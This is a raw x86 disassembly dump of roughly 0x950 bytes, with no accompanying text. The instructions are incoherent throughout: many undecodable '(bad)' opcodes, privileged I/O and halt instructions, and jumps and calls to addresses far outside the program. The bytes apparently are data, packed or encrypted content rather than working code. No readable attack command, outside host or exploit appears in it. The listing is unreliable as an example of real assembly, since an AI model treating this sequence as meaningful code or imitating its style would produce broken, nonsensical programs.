  402ada:	add    eax,DWORD PTR [eax]
  402adc:	xor    ch,BYTE PTR [ecx-0x1700faa9]
  402ae2:	add    ebp,ebx
  402ae4:	cmp    bl,BYTE PTR [ebx-0x7e71fff6]
  402aea:	mov    dl,0xc6
  402aec:	cmp    ecx,ebp
  402aee:	xchg   al,bh
  402af0:	cmp    dh,BYTE PTR [edx-0x16c939fa]
  402af6:	jle    0x402abf
  402af8:	mov    bh,BYTE PTR [si+0x35c2]
  402afd:	jmp    0x65e5b63a
  402b02:	(bad)  
  402b03:	cld    
  402b04:	ret    0xff9b
  402b07:	add    al,0x39
  402b09:	mov    ecx,0x41090003
  402b0e:	shl    ebp,0x96
  402b11:	sbb    DWORD PTR [ebp+eax*2-0x73],edi
  402b15:	icebp  
  402b16:	push   edi
  402b17:	or     al,0x86
  402b19:	jae    0x402aea
  402b1b:	inc    DWORD PTR [ecx+eiz*8]
  402b1e:	fcomi  st,st(4)
	...
  402b34:	ins    BYTE PTR es:[edi],dx
  402b35:	stc    
  402b36:	sar    edi,1
  402b38:	in     al,0xb8
  402b3a:	shl    BYTE PTR [ebp+0x35],cl
  402b3d:	retf   0xfc57
  402b40:	push   ecx
  402b41:	pusha  
  402b42:	or     BYTE PTR [eax],al
  402b44:	cmp    DWORD PTR [eax],eax
  402b46:	out    0x57,al
  402b48:	dec    ebp
  402b49:	out    0x79,eax
  402b4b:	xlat   BYTE PTR ds:[ebx]
  402b4c:	inc    esi
  402b4d:	shl    BYTE PTR [eax+0x3a002dc6],cl
  402b53:	pop    esp
  402b54:	jno    0x402b7d
  402b56:	sub    BYTE PTR [ecx+eiz*1],al
  402b59:	scas   al,BYTE PTR es:[edi]
  402b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b5b:	add    al,0x39
  402b5d:	add    eax,0x854b58a9
  402b62:	xchg   ecx,eax
  402b63:	pop    esp
  402b64:	jge    0x402b8d
  402b66:	sub    BYTE PTR [edx+ebp*2],al
  402b69:	call   0x79f61f
  402b6e:	dec    edx
  402b6f:	cmp    DWORD PTR [eax+0x3f],edx
  402b72:	jmp    0x726c25a3
  402b77:	loopne 0x402b00
  402b79:	sub    eax,0x86cd116
  402b7e:	sbb    DWORD PTR [edi+0x73e900f7],0x8dcc042
  402b88:	outs   dx,BYTE PTR ds:[esi]
  402b89:	xor    eax,0x8fbbabf
  402b8e:	jmp    0x7948680f
  402b93:	jge    0x402b26
  402b95:	jo     0x402c09
  402b97:	push   edi
	...
  402bac:	cmp    eax,0xe0d02925
  402bb1:	shl    DWORD PTR [esi],1
  402bb3:	rcr    DWORD PTR [esi-0x565dc490],1
  402bb9:	and    dh,0x3
  402bbc:	add    eax,0x9134b5f7
  402bc1:	jnp    0x402bf2
  402bc3:	add    al,0x39
  402bc5:	add    eax,0x313e5729
  402bca:	mov    ds:0xf1be8031,al
  402bcf:	add    esi,DWORD PTR [eax+0x7369fffa]
  402bd5:	cld    
  402bd6:	jmp    0x3ae8:0xffffc517
  402bdd:	xor    DWORD PTR [ebx+0x3f],ebx
  402be0:	cmp    BYTE PTR [esi-0x7af816f8],0xec
  402be7:	bound  edi,QWORD PTR [edi+0x8]
  402bea:	or     ebp,DWORD PTR [ecx+0x17ffb86]
  402bf0:	cmp    eax,0x3a71094b
  402bf5:	add    BYTE PTR [eax],al
  402bf7:	jmp    0xe944e9cf
  402bfc:	sub    eax,0xbaf6ebae
  402c01:	pop    ss
  402c02:	pop    esp
  402c03:	sbb    eax,0xbe388036
  402c08:	(bad)  
  402c09:	stc    
  402c0a:	mov    ecx,0x3ae8
  402c0f:	xchg   edx,eax
	...
  402c24:	aas    
  402c25:	xchg   esi,eax
  402c26:	add    cl,ch
  402c28:	cmp    al,BYTE PTR [eax]
  402c2a:	inc    eax
  402c2b:	imul   eax,DWORD PTR [edx+0x0],0xbe4d4d75
  402c32:	leave  
  402c33:	sub    edi,DWORD PTR [esi]
  402c35:	add    BYTE PTR [ebp+0x62],dl
  402c38:	fisubr WORD PTR [eax]
  402c3a:	push   esi
  402c3b:	mov    edx,0xec0c3b35
  402c40:	cmp    bh,ah
  402c42:	(bad)  
  402c43:	call   0x41910c33
  402c48:	in     al,0xcb
  402c4a:	jmp    FWORD PTR [esi]
  402c4c:	adc    eax,0xd418bd8
  402c51:	dec    ebx
  402c52:	or     BYTE PTR [edx+0x47],dh
  402c55:	add    al,0xeb
  402c57:	jmp    0x402c2f
  402c59:	inc    esi
  402c5a:	or     esp,DWORD PTR [eax]
  402c5c:	push   cs
  402c5d:	sti    
  402c5e:	jg     0x402c60
  402c60:	jbe    0x402c34
  402c62:	je     0x402c59
  402c64:	imul   edx,DWORD PTR [ebp+0x15ec0274],0x2b
  402c6b:	sar    dl,0x79
  402c6e:	leave  
  402c6f:	jne    0x402cef
  402c71:	push   esp
  402c72:	ret    
  402c73:	pop    ebx
  402c74:	push   es
  402c75:	and    ecx,ecx
  402c77:	ret    0xfc58
  402c7a:	push   edx
  402c7b:	push   esi
  402c7c:	leave  
  402c7d:	clc    
  402c7e:	(bad)  
  402c7f:	jmp    DWORD PTR [eax]
  402c81:	push   esp
  402c82:	xor    edx,edx
  402c84:	xor    bl,0xda
  402c87:	nop
	...
  402c9c:	mov    ah,0x54
  402c9e:	movzx  esp,al
  402ca1:	push   esp
  402ca2:	cmp    al,0x2b
  402ca4:	nop
  402ca5:	sub    DWORD PTR [esi],eax
  402ca7:	nop
  402ca8:	xchg   ebx,eax
  402ca9:	ret    0x903e
  402cac:	push   ebx
  402cad:	lock cs nop
  402cb0:	dec    ebp
  402cb1:	push   es
  402cb2:	nop
  402cb3:	and    DWORD PTR [edx-0x5bbc7001],0xfffffff3
  402cba:	(bad)  
  402cbb:	jl     0x402c97
  402cbd:	(bad)  
  402cbe:	cmp    BYTE PTR [eax+0x403f8e7],dl
  402cc4:	jecxz  0x402c59
  402cc6:	inc    ebx
  402cc7:	cmp    al,0x91
  402cc9:	push   ebx
  402cca:	jl     0x402cd7
  402ccc:	and    al,0x1a
  402cce:	nop
  402ccf:	jg     0x402c6f
  402cd1:	out    dx,eax
  402cd2:	inc    eax
  402cd3:	nop
  402cd4:	mov    ds:0x713c4393,eax
  402cd9:	push   ebx
  402cda:	jl     0x402ce6
  402cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cdd:	cmp    DWORD PTR [eax+0x46ef9d7f],edx
  402ce3:	add    edx,DWORD PTR [eax+0x43]
  402ce6:	rol    edx,0x9e
  402ce9:	loope  0x402c9c
  402ceb:	sar    DWORD PTR [ecx],0x23
  402cee:	push   es
  402cef:	mov    edi,DWORD PTR [ebx-0x52]
  402cf2:	mov    ebx,0x3ad161c1
  402cf7:	nop
  402cf8:	mov    dl,0x12
  402cfa:	je     0x402d5a
  402cfc:	add    bl,BYTE PTR [edx]
  402cfe:	cmp    DWORD PTR [ebx+0x0],ecx
	...
  402d14:	gs push 0x36
  402d17:	push   esi
  402d18:	dec    ebp
  402d19:	push   edx
  402d1a:	pop    eax
  402d1b:	or     BYTE PTR [ecx-0x56efafae],ch
  402d21:	bound  eax,QWORD PTR [eax+0xc]
  402d24:	leave  
  402d25:	jmp    0x299c10d4
  402d2a:	xor    al,0x90
  402d2c:	adc    DWORD PTR [ebx],ecx
  402d2e:	iret   
  402d2f:	call   FWORD PTR [esi]
  402d31:	sub    DWORD PTR [eax-0x661e6837],ecx
  402d37:	shl    DWORD PTR [ecx],0xd1
  402d3a:	jae    0x402d7f
  402d3c:	sbb    esp,DWORD PTR [ecx+0x59a95973]
  402d42:	lds    eax,FWORD PTR [ecx+ecx*8]
  402d45:	pop    ecx
  402d46:	fadd   QWORD PTR [ecx+ecx*8]
  402d49:	add    eax,0x99b290ae
  402d4e:	jae    0x402dae
  402d50:	jle    0x402d44
  402d52:	mov    esp,0x38d945c2
  402d57:	mov    ebx,ebp
  402d59:	push   edi
  402d5a:	(bad)  
  402d5b:	in     al,dx
  402d5c:	(bad)  
  402d5d:	sub    eax,0x121253ce
  402d62:	add    BYTE PTR [ebp-0x4b],0x88
  402d66:	pop    ebx
  402d67:	pusha  
  402d68:	pusha  
  402d69:	cwde   
  402d6a:	add    edi,edi
  402d6c:	ins    BYTE PTR es:[edi],dx
  402d6d:	xchg   esp,eax
  402d6e:	sbb    al,0x41
  402d70:	cmp    DWORD PTR [ecx+0x26],eax
  402d73:	(bad)  
  402d74:	cmp    ecx,ebx
  402d76:	cli    
  402d77:	mov    edi,0x0
	...
  402d8c:	add    al,0x0
  402d8e:	retf   
  402d8f:	into   
  402d90:	or     al,0xf0
  402d92:	sbb    eax,0xea5a2d58
  402d97:	pop    ecx
  402d98:	cmp    edi,ecx
  402d9a:	xchg   esp,eax
  402d9b:	sti    
  402d9c:	outs   dx,DWORD PTR ds:[esi]
  402d9d:	push   esp
  402d9e:	add    eax,0xe9c64ddb
  402da3:	add    esi,DWORD PTR [edx]
  402da5:	sar    BYTE PTR [esp+eax*1-0x6],0xce
  402daa:	je     0x402d7b
  402dac:	popa   
  402dad:	fisubr WORD PTR [esp+eax*1-0x23e04c7]
  402db4:	mov    ch,0xc4
  402db6:	jmp    0x64bb66be
  402dbb:	shr    DWORD PTR [edi],1
  402dbd:	into   
  402dbe:	(bad)  
  402dbf:	xor    al,0x91
  402dc1:	add    al,0xe8
  402dc3:	add    edi,DWORD PTR [ecx]
  402dc5:	fcom   DWORD PTR [ebx-0x1dffc638]
  402dcb:	ret    
  402dcc:	test   BYTE PTR ds:[ebp+0x4],dl
  402dd0:	cmp    DWORD PTR [eax],eax
  402dd2:	fadd   QWORD PTR [edi]
  402dd4:	cmp    BYTE PTR [eax],al
  402dd6:	jmp    0xe9dfedd7
  402ddb:	add    edi,DWORD PTR [ecx]
  402ddd:	pop    edx
  402dde:	jmp    0x8011ea61
  402de3:	int    0xde
  402de5:	xor    BYTE PTR [ecx-0x16ff0273],al
  402deb:	jle    0x402da1
  402ded:	shl    DWORD PTR [edi-0x33],1
	...
  402e04:	(bad)  
  402e05:	xor    BYTE PTR [ecx+0x44],dl
  402e08:	mov    edi,0xf6f956cd
  402e0d:	push   ebx
  402e0e:	in     eax,dx
  402e0f:	pop    ebx
  402e10:	xchg   edi,eax
  402e11:	sbb    BYTE PTR [eax+0x3a83b403],ch
  402e17:	into   
  402e18:	sahf   
  402e19:	int    0x0
  402e1b:	cdq    
  402e1c:	jb     0x402dc5
  402e1e:	imul   BYTE PTR [esi]
  402e20:	jl     0x402def
  402e22:	jne    0x402e15
  402e24:	dec    edx
  402e25:	fsub   DWORD PTR [esi+edx*1]
  402e28:	ins    BYTE PTR es:[edi],dx
  402e29:	int    0xeb
  402e2b:	out    0x85,al
  402e2d:	push   ebx
  402e2e:	or     BYTE PTR [esi+esi*4-0x2f],bl
  402e32:	inc    BYTE PTR [esi]
  402e34:	je     0x402e66
  402e36:	call   0xdb579
  402e3b:	pusha  
  402e3c:	mov    esi,0x7deefedc
  402e41:	pop    edx
  402e42:	add    BYTE PTR [ebx+0x3d],dl
  402e45:	pop    edx
  402e46:	add    dl,BYTE PTR [ebx+0x35]
  402e49:	pop    edx
  402e4a:	add    eax,DWORD PTR [ecx+0x3d]
  402e4d:	add    BYTE PTR [eax],al
  402e4f:	test   eax,0xc7ec92fd
  402e54:	cmc    
  402e55:	int3   
  402e56:	call   0x402828
  402e5b:	pop    edi
  402e5c:	jg     0x402e26
  402e5e:	inc    eax
  402e5f:	xor    eax,0xf975ce1d
  402e64:	cmc    
  402e65:	push   edx
  402e66:	or     al,0x9e
	...
  402e7c:	addr16 enter 0xc7e8,0x14
  402e81:	int    0xff
  402e83:	bound  esp,QWORD PTR [edx+0x28175cc]
  402e89:	stos   BYTE PTR es:[edi],al
  402e8a:	ret    
  402e8b:	jmp    0xfd1b27ca
  402e90:	ror    ebp,1
  402e92:	mov    ch,0x7d
  402e94:	cld    
  402e95:	int3   
  402e96:	call   DWORD PTR [ecx+0x37]
  402e99:	les    eax,FWORD PTR [eax]
  402e9b:	jmp    0x582cc18d
  402ea0:	test   esp,ecx
  402ea2:	call   0xcb6c8
  402ea7:	add    BYTE PTR [ebx],ch
  402ea9:	rcr    BYTE PTR [ebx-0x37],0x52
  402ead:	int    0xff
  402eaf:	push   esp
  402eb0:	sbb    ebp,DWORD PTR [ebp-0x44b33b7f]
  402eb6:	(bad)  
  402eb7:	inc    ebx
  402eb9:	mov    ebx,0x361f0c75
  402ebe:	or     BYTE PTR [eax-0x40],ch
  402ec1:	jmp    0xf67f2f06
  402ec6:	je     0x402ef1
  402ec8:	xchg   ecx,eax
  402ec9:	add    al,ch
  402ecb:	mov    ecx,0xbffb865
  402ed0:	and    ah,cl
  402ed2:	test   dl,bl
  402ed4:	pusha  
  402ed5:	add    BYTE PTR [eax],al
  402ed7:	sub    edi,DWORD PTR [ebx+0x46]
  402eda:	test   edi,ebp
  402edc:	pop    esi
  402edd:	mov    eax,0x50ff
	...
  402ef2:	add    BYTE PTR [eax],al
  402ef4:	js     0x402ef6
  402ef6:	add    DWORD PTR [eax],eax
  402ef8:	and    BYTE PTR [eax+0x10c3e4],ch
  402efe:	or     eax,eax
  402f00:	cmovl  edi,DWORD PTR [ebp+0x3d002000]
  402f07:	add    al,0x21
  402f09:	add    BYTE PTR [eax],al
  402f0b:	seta   BYTE PTR [edx+0x0]
  402f0f:	add    BYTE PTR [eax],dl
  402f11:	dec    ecx
  402f12:	inc    ebp
  402f13:	cld    
  402f14:	xor    BYTE PTR [edx+edi*4-0x72484017],ch
  402f1b:	test   edi,ecx
  402f1d:	mov    dh,0xff
  402f1f:	inc    DWORD PTR [eax-0x54]
  402f22:	dec    edi
  402f23:	std    
  402f24:	dec    edi
  402f25:	mov    bh,0xb
  402f27:	rol    ch,0xe3
  402f2a:	addr16 out 0x28,al
  402f2d:	inc    ebp
  402f2e:	add    BYTE PTR [ebp-0x158ab],cl
  402f34:	cmp    DWORD PTR [edx],esi
  402f36:	xor    al,0xe8
  402f38:	mov    eax,ds:0xa6ffcb34
  402f3d:	mov    ebx,?
  402f3f:	dec    edi
  402f40:	xchg   ecx,eax
  402f41:	(bad)  
  402f42:	sar    edi,1
  402f44:	xchg   esi,eax
  402f45:	ds sti 
  402f47:	inc    BYTE PTR [ecx+eiz*8]
  402f4a:	js     0x402ed1
  402f4c:	xchg   esi,eax
  402f4d:	and    ecx,ebx
  402f4f:	(bad)  
  402f50:	jmp    0x7735e945
  402f55:	repnz xor edi,edi
	...
  402f6c:	in     al,0xfc
  402f6e:	xor    ebp,eax
  402f70:	fucomip st,st(5)
  402f72:	retf   0x32ff
  402f75:	sbb    DWORD PTR [eax+0x53],edx
  402f78:	push   esi
  402f79:	dec    esp
  402f7a:	(bad)  
  402f7b:	call   0xb2fee
  402f80:	mov    al,0x1c
  402f82:	int3   
  402f83:	cmp    DWORD PTR [eax+eiz*8+0x647b7403],0x40
  402f8b:	hlt    
  402f8c:	mov    DWORD PTR [edx-0xcee03b0],edi
  402f92:	mov    edi,0xc3643900
  402f97:	js     0x402fe4
  402f99:	xchg   edx,eax
  402f9a:	push   eax
  402f9b:	hlt    
  402f9c:	and    edi,edx
  402f9e:	mov    BYTE PTR [eax],0x39
  402fa1:	into   
  402fa2:	ret    
  402fa3:	je     0x402ffc
  402fa5:	or     ebx,ecx
  402fa7:	jne    0x402f9a
  402fa9:	add    BYTE PTR ds:0x7e79eef2,0xd8
  402fb0:	add    DWORD PTR [edx-0x167507b0],0x51cb2cdb
  402fba:	retf   0x44ff
  402fbd:	push   ebp
  402fbe:	(bad)  
  402fc0:	sti    
  402fc1:	(bad)  
  402fc2:	call   0xed84e1ca
  402fc7:	retf   0xc82c
  402fca:	add    sp,WORD PTR [ecx+0xca58b8]
	...
  402fe1:	add    BYTE PTR [eax],al
  402fe3:	add    BYTE PTR [esi-0x6e384336],ah
  402fe9:	sbb    DWORD PTR [eax-0x36],edx
  402fec:	xchg   esi,eax
  402fed:	jbe    0x403019
  402fef:	cmp    BYTE PTR cs:[ebp+0x76ec03e1],0x15
  402ff7:	xor    dh,BYTE PTR [edx+0x48def14c]
  402ffd:	xor    eax,DWORD PTR [edx]
  402fff:	add    ebx,eax
  403001:	inc    edx
  403002:	call   0x69836e82
  403007:	or     bh,BYTE PTR [ecx]
  403009:	push   ebp
  40300a:	hlt    
  40300b:	sub    DWORD PTR [esi],eax
  40300d:	inc    ebx
  40300e:	imul   ecx,DWORD PTR [edx],0x83035419
  403014:	push   es
  403015:	std    
  403016:	pop    esp
  403017:	fistp  QWORD PTR [ecx+0x194ff30a]
  40301d:	adc    DWORD PTR [esi],0x62a5aafb
  403023:	inc    edi
  403024:	xor    ecx,ecx
  403026:	cmp    al,0xfc
  403028:	push   ss
  403029:	test   BYTE PTR [ebx-0x4e82c6fc],ch
  40302f:	add    al,0x87
  403031:	and    DWORD PTR [ecx+0x48],ebp
  403034:	inc    ecx
  403035:	leave  
  403036:	leave  
  403037:	dec    edi
  403038:	and    al,0x80
  40303a:	sbb    eax,0x1cfbf60c
  40303f:	cli    
  403040:	outs   dx,BYTE PTR ds:[esi]
  403041:	dec    esp
  403042:	ror    eax,1
  403044:	xor    edx,DWORD PTR [esi+ebp*8-0x7d]
	...
  40305c:	pop    ebp
  40305d:	or     BYTE PTR [esi-0x5],bh
  403060:	dec    ebp
  403061:	add    DWORD PTR [eax],eax
  403063:	scas   eax,DWORD PTR es:[edi]
  403064:	jns    0x40306e
  403066:	(bad)  
  403067:	jmp    0xec2b2f51
  40306c:	fnstsw WORD PTR [edi+ebx*2+0x47f30]
  403073:	mov    esp,0x2583dc2d
  403078:	cdq    
  403079:	sub    eax,0x1aa40483
  40307e:	inc    ecx
  40307f:	jmp    0x6a5284be
  403084:	ss icebp 
  403086:	cs test al,0x3a
  403089:	add    BYTE PTR [eax+esi*8-0x4b],dh
  40308d:	or     edi,edi
  40308f:	iret   
  403090:	sti    
  403091:	(bad)  
  403092:	call   FWORD PTR [ebx-0x4d3feac7]
  403098:	mov    ds:0x3de908be,eax
  40309d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40309e:	(bad)  
  40309f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030a0:	xchg   BYTE PTR [eax],al
  4030a2:	add    cl,ch
  4030a4:	cmp    bh,BYTE PTR [ebx+0x45]
  4030a7:	icebp  
  4030a8:	or     cl,cl
  4030aa:	jne    0x40309d
  4030ac:	fdiv   st(7),st
  4030ae:	(bad)  
  4030af:	hlt    
  4030b0:	sub    eax,0x2de9411a
  4030b5:	mov    DWORD PTR [edx+esi*1+0x5],esi
  4030b9:	push   edx
  4030ba:	ret    0x3ae9
  4030bd:	jne    0x40308f
  4030bf:	ins    BYTE PTR es:[edi],dx
	...
  4030d4:	push   edi
  4030d5:	aam    0x50
  4030d7:	inc    ebx
  4030d8:	push   ebp
  4030d9:	cs call esp
  4030dc:	icebp  
  4030dd:	sbb    DWORD PTR [ecx-0x17],eax
  4030e0:	std    
  4030e1:	mov    BYTE PTR [eax+edx*8-0x7],dh
  4030e5:	inc    edx
  4030e6:	in     al,0xe8
  4030e8:	cmp    al,BYTE PTR [eax]
  4030ea:	add    BYTE PTR [esi+0x8fc877],cl
  4030f0:	or     eax,0x5475ffac
  4030f5:	dec    eax
  4030f6:	inc    ebp
  4030f7:	in     al,dx
  4030f8:	arpl   WORD PTR [edx+0xc],ax
  4030fb:	add    ah,cl
  4030fd:	(bad)
  403100:	pusha  
  403101:	add    eax,DWORD PTR [eax]
  403103:	add    BYTE PTR [eax-0x2238f855],ah
  403109:	lods   al,BYTE PTR ds:[esi]
  40310a:	add    BYTE PTR [eax],al
  40310c:	nop
  40310d:	cld    
  40310e:	imul   eax,DWORD PTR [eax],0x1069fc8a
  403114:	and    eax,0x7a50e40a
  403119:	cld    
  40311a:	(bad)  
  40311b:	jne    0x403169
  40311d:	mov    eax,0x3d671715
  403122:	add    BYTE PTR [ebx],cl
  403124:	and    BYTE PTR [ecx],bh
  403126:	add    DWORD PTR [ebx-0x1d],eax
  403129:	inc    ecx
  40312a:	hlt    
  40312b:	add    ah,cl
  40312d:	(bad)  
  40312e:	(bad)  
  40312f:	jne    0x40318d
  403131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403132:	call   0xc3:0x8afc60c1
	...
  403149:	add    BYTE PTR [eax],al
  40314b:	add    BYTE PTR [ebx+0x5008c285],ch
  403151:	sbb    DWORD PTR [ebx+0x82e57ec],ecx
  403157:	call   0x40ef08
  40315c:	pusha  
  40315d:	or     al,0xe8
  40315f:	mov    al,ds:0x50ffc000
  403164:	div    DWORD PTR [ecx]
  403166:	or     BYTE PTR [eax-0x18],dl
  403169:	popf   
  40316a:	rol    DWORD PTR [eax],0x20
  40316d:	sbb    al,0xc9
  40316f:	ret    0x41c
  403172:	push   ebp
  403173:	mov    esp,DWORD PTR [ebx+eax*4-0x7ccc033c]
  40317a:	jge    0x403184
  40317c:	cmp    ecx,ebx
  40317e:	push   eax
  40317f:	pop    es
  403180:	adc    bl,BYTE PTR [ecx-0x2a0436d5]
  403186:	add    ebp,DWORD PTR [ebx]
  403188:	repnz repz add ebp,DWORD PTR [edx+0x39]
  40318d:	add    eax,DWORD PTR [edx+ebp*2]
  403190:	cmp    DWORD PTR [ebx],eax
  403192:	(bad)  
  403193:	inc    DWORD PTR [ecx+edx*8+0x59]
  403197:	add    BYTE PTR [ebx],ah
  403199:	(bad)  
  40319b:	les    edi,FWORD PTR [eax-0x27]
  40319e:	add    ecx,DWORD PTR [ebx]
  4031a0:	jns    0x40314f
  4031a2:	adc    cl,BYTE PTR [ecx+0x75c73cf4]
  4031a8:	xchg   ebp,eax
  4031a9:	xor    DWORD PTR [esi],ebp
  4031ab:	lock mov cs,WORD PTR [esi]
  4031ae:	sti    
  4031af:	mov    edi,0x0
	...
  4031c4:	or     eax,0x13d87afd
  4031c9:	fstp   DWORD PTR [ecx+0x0]
  4031cc:	jbe    0x40323a
  4031ce:	(bad)  
  4031cf:	push   ebx
  4031d0:	jecxz  0x4031bf
  4031d2:	(bad)  
  4031d3:	jne    0x403206
  4031d5:	add    DWORD PTR [ebx],0x6a
  4031d8:	cmp    ecx,esi
  4031da:	ins    BYTE PTR es:[edi],dx
  4031db:	sar    DWORD PTR [ecx],0xd9
  4031de:	cli    
  4031df:	mov    edi,0xe832e0c4
  4031e4:	and    cl,cl
  4031e6:	(bad)  
  4031e7:	call   DWORD PTR [edx]
  4031e9:	ret    0xc37a
  4031ec:	xchg   edx,eax
  4031ed:	nop
  4031ee:	rol    DWORD PTR [ecx+edi*1],0x4
  4031f2:	jnp    0x4031e0
  4031f4:	mov    edx,0x8a50d79c
  4031f9:	call   0x52af892f
  4031fe:	inc    eax
  4031ff:	or     al,0xbc
  403201:	pusha  
  403202:	add    DWORD PTR [eax],0x39
  403205:	fnstcw WORD PTR [eax+0x14]
  403208:	hlt    
  403209:	(bad)  
  40320a:	call   0x72406b12
  40320f:	stos   DWORD PTR es:[edi],eax
  403210:	ret    0xa8b7
  403213:	fstp   TBYTE PTR [edi]
  403215:	jns    0x40323b
  403217:	fdiv   DWORD PTR [edx-0x2ffd0ebc]
  40321d:	mov    ebp,0xe2ba83e6
  403222:	mov    dh,0x1a
  403224:	ret    0x7282
  403227:	or     eax,DWORD PTR [eax]
	...
  403239:	add    BYTE PTR [eax],al
  40323b:	add    BYTE PTR [ebx-0xa],cl
  40323e:	jmp    0xe980240d
  403243:	add    edi,DWORD PTR [ecx]
  403245:	sbb    ebp,DWORD PTR [edx]
  403247:	add    ah,BYTE PTR [ecx-0x4f285b3a]
  40324d:	add    DWORD PTR cs:[ecx+0xc],edi
  403251:	shl    BYTE PTR [esi],1
  403253:	std    
  403254:	cmp    DWORD PTR [ebx],esp
  403256:	lods   al,BYTE PTR ds:[esi]
  403257:	pop    esi
  403258:	jle    0x403297
  40325a:	in     eax,0x7c
  40325c:	shl    BYTE PTR [esi+edx*1+0x1ef7ffbe],cl
  403263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403264:	mov    bl,0x67
  403266:	cs cmp eax,0x11b54e35
  40326c:	dec    ecx
  40326d:	(bad)  
  40326e:	jl     0x403247
  403270:	push   esi
  403271:	dec    esp
  403272:	icebp  
  403273:	js     0x403269
  403275:	iret   
  403276:	cdq    
  403277:	fld    TBYTE PTR [eax+eax*1]
  40327a:	jmp    0xedc86f82
  40327f:	add    edi,DWORD PTR [ecx]
  403281:	add    BYTE PTR [edx+0x47],dh
  403284:	dec    ecx
  403285:	ror    DWORD PTR [esi+eiz*1+0x29302a86],1
  40328c:	xor    DWORD PTR [edi+0x2d16f8ab],0xbcbad872
  403296:	add    BYTE PTR [ebp+0x1a502d57],dh
  40329c:	dec    edx
  40329d:	xor    cl,BYTE PTR [ebx+0x1c]
	...
  4032b3:	add    cl,dh
  4032b5:	jp     0x403334
  4032b7:	icebp  
  4032b8:	jno    0x4032f5
  4032ba:	adc    BYTE PTR [eax+0x26],ah
  4032bd:	les    ecx,FWORD PTR [ebx+0x42561e6]
  4032c3:	jb     0x4032d1
  4032c5:	clc    
  4032c6:	mov    dl,BYTE PTR [esi]
  4032c8:	sar    DWORD PTR [edx-0x7],1
  4032cb:	mov    edx,0xbafb21f0
  4032d0:	lock jae 0x403257
  4032d3:	out    dx,al
  4032d4:	add    bl,BYTE PTR [edx+ebp*2-0x3f01c7ca]
  4032db:	sub    DWORD PTR [edx+eax*1+0x117062c3],esp
  4032e2:	stc    
  4032e3:	or     al,BYTE PTR [ebp+0x96cf911]
  4032e9:	in     eax,dx
  4032ea:	push   ebp
  4032eb:	jle    0x4032b1
  4032ed:	fadd   DWORD PTR [ebx]
  4032ef:	xchg   edi,eax
  4032f0:	jle    0x4032b2
  4032f2:	ret    0x39f5
  4032f5:	mov    al,0x8b
  4032f7:	and    DWORD PTR [eax-0x37],ecx
  4032fa:	and    edx,DWORD PTR [ebx]
  4032fc:	dec    eax
  4032fd:	leave  
  4032fe:	lea    ebx,[ebp+0x64]
  403301:	stos   BYTE PTR es:[edi],al
  403302:	jo     0x4032cd
  403304:	add    DWORD PTR ss:[esi-0xf],ecx
  403308:	jnp    0x4032c9
  40330a:	adc    edx,ebp
  40330c:	cmp    BYTE PTR [ecx-0x6],0xba
  403310:	jb     0x403333
  403312:	stc    
  403313:	sbb    al,BYTE PTR ds:0xfe9c73
	...
  403329:	add    BYTE PTR [eax],al
  40332b:	add    BYTE PTR [esi+esi*4],al
  40332e:	mov    ebp,0xc2639a8
  403333:	test   al,0xf9
  403335:	in     eax,dx
  403336:	add    al,BYTE PTR [eax]
  403338:	fld    DWORD PTR [edi-0x7]
  40333b:	xor    edi,edx
  40333d:	pop    ds
  40333e:	sti    
  40333f:	xor    ecx,edx
  403341:	dec    ebp
  403342:	test   BYTE PTR [edi],al
  403344:	jg     0x403312
  403346:	jnp    0x40333d
  403348:	jecxz  0x40334c
  40334a:	adc    cl,al
  40334c:	mov    al,ds:0x5bc302c3
  403351:	mov    eax,0xb8f3f933
  403356:	xor    edi,ecx
  403358:	dec    ebp
  403359:	push   ebp
  40335a:	pop    ss
  40335b:	sub    dl,BYTE PTR [esi+0x26034743]
  403361:	rol    al,1
  403363:	ret    0xffdc
  403366:	iret   
  403367:	mov    ebx,DWORD PTR [eax]
  403369:	lock cli 
  40336b:	and    ebx,DWORD PTR [edx]
  40336d:	lock cli 
  40336f:	lea    ebx,[esp+ecx*8]
  403372:	adc    al,BYTE PTR [esi+0x40]
  403375:	add    ecx,DWORD PTR fs:[esi-0x68]
  403379:	rol    ecx,0x11
  40337c:	mov    ds:0x83fa8b86,eax
  403381:	mov    eax,0xb883f923
  403386:	lea    ebx,[edi+edi*1+0x4d469501]
  40338d:	add    BYTE PTR [esi+0x1c],bl
	...
  4033a4:	adc    eax,eax
  4033a6:	push   ss
  4033a7:	add    ebp,DWORD PTR [ecx]
  4033a9:	dec    eax
  4033aa:	stc    
  4033ab:	xor    edi,DWORD PTR [edx]
  4033ad:	and    bl,bh
  4033af:	xor    edi,DWORD PTR [edx]
  4033b1:	dec    esi
  4033b2:	test   BYTE PTR [edi],al
  4033b4:	sub    BYTE PTR [ecx-0x80],bl
  4033b7:	imul   edx,DWORD PTR [ebx+0x2],0xf7e0c120
  4033be:	add    al,bl
  4033c0:	stos   DWORD PTR es:[edi],eax
  4033c1:	xor    DWORD PTR [ebx],0xfffffff9
  4033c4:	cmp    esi,esi
  4033c6:	mov    ebx,0x98252033
  4033cb:	pop    ss
  4033cc:	out    0x82,al
  4033ce:	dec    eax
  4033cf:	mov    edi,DWORD PTR [edx]
  4033d1:	jmp    0x4033ba
  4033d3:	sar    bl,0xdd
  4033d6:	push   es
  4033d7:	shl    BYTE PTR [edx+0x1afaf791],1
  4033dd:	lahf   
  4033de:	idiv   edx
  4033e0:	mov    esp,0x82b11355
  4033e5:	push   0xffffffc3
  4033e7:	add    ebp,DWORD PTR [edi-0x3f]
  4033ea:	(bad)
  4033ee:	int    0x8b
  4033f0:	rol    DWORD PTR [esi-0x793fdc45],cl
  4033f6:	mov    ebx,0x81b29d8d
  4033fb:	xlat   BYTE PTR ds:[ebx]
  4033fc:	adc    eax,0x5d5e0750
  403401:	sbb    bh,al
  403403:	push   ss
  403404:	cmp    dl,BYTE PTR [eax]
  403406:	(bad)  
  403407:	stc    
	...
  40341c:	push   0x2f
  40341e:	out    0xfa,eax
  403420:	dec    edx
  403421:	aas    
  403422:	xchg   ecx,eax
  403423:	test   BYTE PTR [esi],dh
  403425:	not    DWORD PTR [eax+edx*4]
  403428:	adc    dl,dh
  40342a:	dec    ecx
  40342b:	xor    BYTE PTR [eax+0x19],bh
  40342e:	or     eax,DWORD PTR [ebx]
